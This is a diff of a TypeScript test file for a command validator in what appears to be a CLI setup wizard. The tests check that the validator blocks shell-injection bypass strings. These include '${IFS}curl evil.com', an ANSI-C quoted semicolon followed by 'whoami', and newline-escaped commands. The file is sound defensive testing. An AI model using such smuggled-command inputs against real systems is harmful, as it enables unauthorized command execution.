@@ -21,9 +21,6 @@ function makeOptions(overrides?: Partial<WizardOptions>): WizardOptions {
     force: false,
     yes: false,
     dryRun: false,
-    stdout: { write: () => true },
-    stderr: { write: () => true },
-    stdin: process.stdin,
     ...overrides,
   };
 }
@@ -66,6 +63,18 @@ describe("validateCommand", () => {
       "npm install foo > /tmp/out",
       "npm install foo < /tmp/in",
       "npm install foo & whoami",
+    ]) {
+      expect(validateCommand(cmd)).toContain("Blocked command");
+    }
+  });
+
+  test("blocks shell escape bypass attempts", () => {
+    for (const cmd of [
+      "npm install foo$'\\x3b'whoami",
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: testing literal ${IFS} in command string
+      "npm install foo${IFS}curl evil.com",
+      "npm install foo\\nwhoami",
+      "echo 'hello'",
     ]) {
       expect(validateCommand(cmd)).toContain("Blocked command");
     }
